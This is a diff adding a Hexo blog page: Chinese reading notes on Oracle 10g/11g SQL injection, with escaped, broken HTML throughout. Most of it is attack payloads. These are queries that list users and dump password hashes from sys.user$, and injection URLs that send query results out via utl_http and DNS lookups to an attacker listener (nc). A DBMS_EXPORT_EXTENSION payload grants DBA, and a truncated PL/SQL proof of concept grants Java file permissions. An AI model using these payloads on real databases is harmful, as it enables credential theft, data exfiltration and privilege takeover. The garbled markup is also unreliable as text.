@@ -1,0 +1,932 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="测试数据库版本：Oracle Database 10g Enterprise Edition Release 10.2.0.1.0&amp;nbsp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="读《Hacking Oracle with Sql Injection》主要利用于：10gr2">
+<meta property="og:url" content="http://yoursite.com/2015/04/11/8b6fa0850f4e9ee9b55c1dc2e1197f7a/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="测试数据库版本：Oracle Database 10g Enterprise Edition Release 10.2.0.1.0&amp;nbsp;">
+<meta property="og:updated_time" content="2018-02-26T05:59:35.178Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="读《Hacking Oracle with Sql Injection》主要利用于：10gr2">
+<meta name="twitter:description" content="测试数据库版本：Oracle Database 10g Enterprise Edition Release 10.2.0.1.0&amp;nbsp;">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2015/04/11/8b6fa0850f4e9ee9b55c1dc2e1197f7a/"/>
+
+
+
+
+
+  <title>读《Hacking Oracle with Sql Injection》主要利用于：10gr2 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2015/04/11/8b6fa0850f4e9ee9b55c1dc2e1197f7a/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">读《Hacking Oracle with Sql Injection》主要利用于：10gr2</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2015-04-11T17:59:11+08:00">
+                2015-04-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/读书笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">读书笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>测试数据库版本：<div><span style="color: rgb(51, 51, 51); font-family: 'Microsoft YaHei', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);">Oracle Database 10g Enterprise Edition Release 10.2.0.1.0&nbsp;</span></div><a id="more"></a><div><span style="color: rgb(51, 51, 51); font-family: 'Microsoft YaHei', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);">Oracle Database 11g Enterprise Edition Release 11.2.0.1.0</span><br></div><div><span style="color: rgb(51, 51, 51); font-family: 'Microsoft YaHei', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);"><br></span></div><div><span style="color: rgb(51, 51, 51); font-family: 'Microsoft YaHei', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);">oracle 注入 信息刺探：</span></div><div><span style="color: rgb(51, 51, 51); font-family: 'Microsoft YaHei', Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);"><br></span></div><div></div></p>
+<pre><code>-- list version&amp;nbsp;&amp;nbsp; select banner from v$version where rownum=1 ;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- oracle version`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- list user&amp;nbsp;&amp;nbsp; select user from dual;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- current user&amp;nbsp;&amp;nbsp; select username from user_users;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- current user&amp;nbsp;&amp;nbsp; select username from all_users;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- all user , the current user can see...&amp;nbsp;&amp;nbsp; select username from dba_users;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- all user , need pris
+
+-- list role&amp;nbsp;&amp;nbsp; select role from session_roles;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- current role`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`
+-- list privs&amp;nbsp;&amp;nbsp; select privilege from user_sys_privs;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- privs the current user has&amp;nbsp;&amp;nbsp; select privilege from role_sys_privs;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- privs the current role has&amp;nbsp;&amp;nbsp; select privilege from session_privs;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- the all privs that current user has = user_sys_privs + role_sys_privs&amp;nbsp;&amp;nbsp; select &amp;#42 from dba_sys_privs;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- all user&apos;s privs , need privs`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`
+-- list password hash&amp;nbsp;&amp;nbsp; select name, password, astatus from sys.user$;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- password hash &amp;lt;=10g , need privs&amp;nbsp;&amp;nbsp; select name, password, spare4 from sys.user$;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- password has 11g , need privs
+
+-- list database&amp;nbsp;&amp;nbsp; select global_name from global_name;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- current database&amp;nbsp;&amp;nbsp; select sys.database_name from dual;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- current database&amp;nbsp;&amp;nbsp; select name from v$database;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- current database name , need privs&amp;nbsp;&amp;nbsp; select instance_name from v$instance;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- current database name , need privs
+`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- list schemas&amp;nbsp;&amp;nbsp; select distinct owner from all_tables;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- all schema`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`
+-- list tables&amp;nbsp;&amp;nbsp; select table_name from all_tables where owner=&apos;xxx&apos;;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;&lt;span style=&quot;font-size: 10.5pt;&quot;&gt;-- all table name&lt;/span&gt;&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- list columns&amp;nbsp;&amp;nbsp; select owner,table_name,column_name from all_tab_columns where table_name=&apos;xxx&apos;;&amp;nbsp;&amp;nbsp; select owner,table_name,column_name from all_tab_cols where table_name=&apos;xxx&apos;;`&lt;/pre&gt;&lt;div style=&quot;color:gray&quot;&gt;
+&lt;/div&gt;&lt;small&gt;&lt;small&gt;&amp;nbsp;&lt;/small&gt;&lt;/small&gt;&lt;span style=&quot;background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; font-size: 10.5pt;&quot;&gt;oracle独有的获取信息的方法吧：&lt;/span&gt;&lt;/div&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`utl_http.request`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;&lt;span style=&quot;font-size: 10.5pt;&quot;&gt;local: nc.traditional -l -p 1234&lt;/span&gt;&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`web: http://www.hellove.net/hellove.php?id=123 and 1=utl_http.request(&apos;http://10.1.100.1/&apos;||(SQL in HERE))&amp;nbsp;&amp;nbsp;
+utl_inaddr.get_host_name`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`error base&amp;nbsp;&amp;nbsp;
+web: http://www.hellove.net/hellove.php?id=123 and 1=utl_inaddr.get_host_name((SQL in HERE))&amp;nbsp;&amp;nbsp;
+utl_inaddr.get_host_address`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`
+error base or dns&amp;nbsp;&amp;nbsp;
+web: http://www.hellove.net/hellove.php?id=123 and 1=utl_inaddr.get_host_address((SQL in HERE))&amp;nbsp;&amp;nbsp;
+ctxsys.drithsx.sn`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`
+error base&amp;nbsp;&amp;nbsp;
+web: http://www.hellove.net/hellove.php?id=123 and 1=ctxsys.drithsx.sn(1,(SQL in HERE))&amp;nbsp;&amp;nbsp;
+sys.dbms_ldap.init`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`dns&amp;nbsp;&amp;nbsp;
+web: http://www.hellove.net/hellove.php?id=123 and SYS.DBMS_LDAP.INIT(((SQL in HERE)||&apos;hellove.net&apos;,80) is not null
+`&lt;/pre&gt;
+
+utl_http.request,
+
+utl_inaddr.get_host_name,
+
+utl_inaddr.get_host_address
+
+由于11g的安全特性无法继续使用，但是我们 可以在**显错模式**下利用ctxsys.drithsx.sn，
+
+或者自己搭建一个dnsserver，将一个域名的解析server指向该server，
+
+利用sys.dbms_ldap.init 还可以在11g下正常工作
+&lt;div style=&quot;color:gray&quot;&gt;
+&lt;/div&gt;&lt;small&gt;&lt;small&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 14pt;&quot;&gt;**&amp;nbsp;权限提升：**&lt;/span&gt;&lt;/small&gt;&lt;/small&gt;&lt;div&gt;&lt;span style=&quot;font-size: 19px; line-height: 27px;&quot;&gt;**&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 12pt;&quot;&gt;​&lt;/span&gt;**&lt;/span&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;get_domain_index_metadata，&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;get_v2_domain_index_tables，&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;1\. get_domain_index_tables（&lt;/span&gt;&lt;span style=&quot;background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; font-size: 10.5pt;&quot;&gt;10g r2未打补丁的情况下，还存在着&lt;/span&gt;&lt;span style=&quot;background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; font-size: 10.5pt;&quot;&gt;）&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;三个函数在06年7月之后就被修复了，也就是说 oracle 11g就不能再用了&lt;/span&gt;&lt;span style=&quot;background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; font-size: 10.5pt;&quot;&gt;
+&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;span style=&quot;background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; font-size: 10.5pt;&quot;&gt;
+&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`web: http://www.hellove.net/hellove.php?id=123 and SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;INDX&apos;,&apos;SCH&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);execute immediate &apos;&apos;declare pragma autonomous_transaction; begin execute immediate &apos;&apos;&apos;&apos;grant dba to hellove&apos;&apos;&apos;&apos;; end;&apos;&apos;; END;--&apos;,&apos;SYS&apos;,1,&apos;1&apos;,0)=0;`&lt;/pre&gt;&lt;div&gt;
+&lt;/div&gt;&lt;div&gt;&lt;span style=&quot;color: rgb(153, 153, 153); font-family: Optima, Georgia, STSong, serif; line-height: 24px; background-color: rgb(248, 248, 248);&quot;&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 12pt;&quot;&gt;2.因为** dbms_xmlquery.newcontext**与**dbms_xmlquery.getxml**&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; font-size: 10.5pt;&quot;&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 12pt;&quot;&gt;仅能在pl/sql环境下利用的 漏洞，在web下也能利用了&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`dbms_xmlquery.getxml() public role&amp;nbsp;&amp;nbsp;
+dbms_xmlquery.newcontext() public role&amp;nbsp;&amp;nbsp;
+sys.kupp$proc.create_mater_process() dba role`&lt;/pre&gt;&lt;/div&gt;
+&lt;small&gt;&lt;small&gt;&amp;nbsp;&lt;/small&gt;&lt;/small&gt;&lt;span style=&quot;background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; font-size: 10.5pt;&quot;&gt;只要有create session就可以了，只可惜DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS不能在web环境中直接调用，作者给的poc能使我们的用户直接得到Java权限&lt;/span&gt;&lt;/div&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`DECLARE&amp;nbsp;&amp;nbsp;
+POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;&amp;nbsp;&amp;nbsp;
+CURSOR C1 IS SELECT &apos;GRANT&apos;,USER(), &apos;SYS&apos;,&apos;java.io.FilePermission&apos;,&apos;&amp;lt;&amp;lt;ALL FILES&amp;gt;&amp;gt;&apos;,&apos;execute&apos;,&apos;ENABLED&apos; from dual;&amp;nbsp;&amp;nbsp;
+BEGIN&amp;nbsp;&amp;nbsp;
+OPEN C1;&amp;nbsp;&amp;nbsp;
+FETCH C1 BULK COLLECT INTO POL;&amp;nbsp;&amp;nbsp;
+CLOSE C1;&amp;nbsp;&amp;nbsp;
